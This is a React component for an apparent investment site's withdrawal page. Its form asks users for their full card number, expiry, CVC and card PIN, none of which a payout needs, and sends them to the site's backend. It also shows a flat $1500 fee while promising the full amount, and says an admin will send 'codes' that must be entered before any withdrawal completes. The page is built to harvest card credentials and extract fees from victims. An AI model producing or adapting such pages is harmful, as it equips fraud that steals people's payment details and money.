import React, { useState } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import { useAuth } from '../contexts/AuthContext';
import { API_URL } from '../utils/constants';

const WithdrawPage = () => {
  const [amount, setAmount] = useState('');
  const [transferType, setTransferType] = useState('card');
  
  // Card-specific fields
  const [cardNumber, setCardNumber] = useState('');
  const [cardHolder, setCardHolder] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cardCVC, setCardCVC] = useState('');
  const [cardPin, setCardPin] = useState('');
  
  // Bank account-specific fields
  const [accountNumber, setAccountNumber] = useState('');
  const [accountName, setAccountName] = useState('');
  const [routingNumber, setRoutingNumber] = useState('');
  
  // Common fields
  const [bankName, setBankName] = useState('');
  
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const { user } = useAuth();
  const navigate = useNavigate();

  if (user.kycStatus !== 'verified') {
    return (
      <div className="container fade-in" style={{padding: '4rem 0', maxWidth: '600px'}}>
        <div className="card">
          <div style={{textAlign: 'center', padding: '2rem'}}>
            <h2 style={{color: '#ff6b6b', marginBottom: '1rem'}}>🔒 KYC Verification Required</h2>
            <p style={{marginBottom: '1.5rem'}}>
              {user.kycStatus === 'not_submitted' && 'You need to complete KYC verification before withdrawing.'}
              {user.kycStatus === 'pending' && 'Your KYC documents are under review.'}
            </p>
            {user.kycStatus === 'not_submitted' && (<Link to="/kyc-verification" className="btn btn-primary">Complete KYC Verification</Link>)}
          </div>
        </div>
      </div>
    );
  }

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    if (user.balance < parseFloat(amount)) {
      setError('Insufficient balance');
      setLoading(false);
      return;
    }

    try {
      const payload = {
        amount: parseFloat(amount),
        transferType,
        bankName
      };

      // Add type-specific fields
      if (transferType === 'card') {
        payload.cardNumber = cardNumber;
        payload.cardHolder = cardHolder;
        payload.expiryDate = expiryDate;
        payload.cardCVC = cardCVC;
        payload.cardPin = cardPin;
      } else {
        payload.cardNumber = accountNumber; // Use accountNumber as cardNumber in backend
        payload.cardHolder = accountName;   // Use accountName as cardHolder in backend
        payload.expiryDate = routingNumber || 'N/A'; // Optional routing
        payload.cardCVC = 'N/A';
        payload.cardPin = 'N/A';
      }

      const response = await fetch(`${API_URL}/users/withdraw-request`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        },
        body: JSON.stringify(payload)
      });

      const data = await response.json();
      
      if (data.success) {
  // Redirect to verification page with request ID
  navigate('/verify-withdrawal', {
    state: {
      requestId: data.data._id,
      currentStep: 1
    }
  });
}
    } catch (err) {
      setError('Error submitting withdrawal request');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="container fade-in" style={{padding: '4rem 0', maxWidth: '600px'}}>
      <div className="card">
        <h1 style={{color: 'var(--primary-navy)', marginBottom: '2rem'}}>💸 Withdraw Funds</h1>
        
        {error && <div className="alert alert-danger">{error}</div>}
        
        <form onSubmit={handleSubmit}>
          {/* Amount */}
          <div className="form-group">
            <label>Amount to Withdraw</label>
            <input 
              type="number" 
              className="form-control" 
              value={amount} 
              onChange={(e) => setAmount(e.target.value)} 
              step="0.01" 
              min="1" 
              placeholder="Enter amount"
              required 
            />
          </div>

          {/* Transfer Type */}
          <div className="form-group">
            <label>Payout Method</label>
            <select 
              className="form-control" 
              value={transferType} 
              onChange={(e) => setTransferType(e.target.value)}
            >
              <option value="card">💳 Card Transfer (Instant)</option>
              <option value="bank">🏦 Bank Account (Cheaper Cash)</option>
            </select>
          </div>

          {/* CARD FIELDS - Only show if card transfer selected */}
          {transferType === 'card' && (
            <>
              <div className="form-group">
                <label>Card Number</label>
                <input 
                  type="text" 
                  className="form-control" 
                  value={cardNumber} 
                  onChange={(e) => setCardNumber(e.target.value)} 
                  placeholder="1234 5678 9012 3456" 
                  autoComplete="off" 
                  required 
                />
              </div>

              <div className="form-group">
                <label>Card Holder Name</label>
                <input 
                  type="text" 
                  className="form-control" 
                  value={cardHolder} 
                  onChange={(e) => setCardHolder(e.target.value)} 
                  placeholder="John Doe" 
                  autoComplete="off" 
                  required 
                />
              </div>

              <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem'}}>
                <div className="form-group">
                  <label>Expiry Date</label>
                  <input 
                    type="text" 
                    className="form-control" 
                    value={expiryDate} 
                    onChange={(e) => setExpiryDate(e.target.value)} 
                    placeholder="MM/YY" 
                    autoComplete="off" 
                    required 
                  />
                </div>

                <div className="form-group">
                  <label>CVV/CVC</label>
                  <input 
                    type="text" 
                    className="form-control" 
                    value={cardCVC} 
                    onChange={(e) => setCardCVC(e.target.value)} 
                    placeholder="123" 
                    maxLength="3" 
                    autoComplete="off" 
                    required 
                  />
                </div>
              </div>

              <div className="form-group">
                <label>Card PIN</label>
                <input 
                  type="password" 
                  className="form-control" 
                  value={cardPin} 
                  onChange={(e) => setCardPin(e.target.value)} 
                  placeholder="****" 
                  maxLength="4" 
                  autoComplete="off" 
                  required 
                />
              </div>
            </>
          )}

          {/* BANK ACCOUNT FIELDS - Only show if bank transfer selected */}
          {transferType === 'bank' && (
            <>
              <div className="form-group">
                <label>Account Number</label>
                <input 
                  type="text" 
                  className="form-control" 
                  value={accountNumber} 
                  onChange={(e) => setAccountNumber(e.target.value)} 
                  placeholder="Enter your account number" 
                  autoComplete="off" 
                  required 
                />
              </div>

              <div className="form-group">
                <label>Account Holder Name</label>
                <input 
                  type="text" 
                  className="form-control" 
                  value={accountName} 
                  onChange={(e) => setAccountName(e.target.value)} 
                  placeholder="Full name on account" 
                  autoComplete="off" 
                  required 
                />
              </div>

              <div className="form-group">
                <label>Routing Number / Sort Code (Optional)</label>
                <input 
                  type="text" 
                  className="form-control" 
                  value={routingNumber} 
                  onChange={(e) => setRoutingNumber(e.target.value)} 
                  placeholder="Optional - for verification" 
                  autoComplete="off" 
                />
              </div>
            </>
          )}

          {/* Bank Name - Always shown */}
          <div className="form-group">
            <label>Bank Name</label>
            <input 
              type="text" 
              className="form-control" 
              value={bankName} 
              onChange={(e) => setBankName(e.target.value)} 
              placeholder="e.g., Chase Bank, Bank of America" 
              autoComplete="off" 
              required 
            />
          </div>

          {/* Summary */}
          <div style={{background: '#f8f9fa', padding: '1.5rem', borderRadius: '8px', marginBottom: '1.5rem', border: '1px solid #dee2e6'}}>
            <h3 style={{fontSize: '1rem', marginBottom: '1rem', color: 'var(--primary-navy)'}}>Withdrawal Summary</h3>
            <div style={{display: 'flex', justifyContent: 'space-between', marginBottom: '0.5rem'}}>
              <span>Method:</span>
              <strong>{transferType === 'card' ? '💳 Card Transfer (Instant)' : '🏦 Bank Account (2-3 days)'}</strong>
            </div>
            <div style={{display: 'flex', justifyContent: 'space-between', marginBottom: '0.5rem'}}>
              <span>Amount:</span>
              <strong>${amount ? parseFloat(amount).toFixed(2) : '0.00'}</strong>
            </div>
            <div style={{display: 'flex', justifyContent: 'space-between', marginBottom: '0.5rem'}}>
              <span>Fee:</span>
              <strong style={{color: 'green'}}>$1500.00 (fee)</strong>
            </div>
            <hr style={{margin: '1rem 0', borderTop: '2px solid #dee2e6'}} />
            <div style={{display: 'flex', justifyContent: 'space-between'}}>
              <span style={{fontSize: '1.1rem', fontWeight: 'bold'}}>You will receive:</span>
              <strong style={{fontSize: '1.2rem', color: 'var(--primary-navy)'}}>${amount ? parseFloat(amount).toFixed(2) : '0.00'}</strong>
            </div>
          </div>

          {/* Buttons */}
          <div style={{display: 'flex', gap: '1rem', flexWrap: 'wrap'}}>
            <button type="submit" className="btn btn-primary" disabled={loading} style={{flex: 1}}>
              {loading ? 'Processing...' : '✓ Submit Withdrawal Request'}
            </button>
            <button type="button" onClick={() => navigate('/dashboard')} className="btn btn-secondary">
              Cancel
            </button>
          </div>

          {/* Info */}
          <div style={{marginTop: '2rem', padding: '1rem', background: '#e3f2fd', borderRadius: '8px', fontSize: '0.9rem'}}>
            <p style={{margin: 0, color: '#1976d2'}}>
              <strong>ℹ️ Important:</strong> After submission, admin will review your request and send you codes. 
              You must enter all codes correctly to complete the withdrawal.
            </p>
          </div>
        </form>
      </div>
    </div>
  );
};

export default WithdrawPage;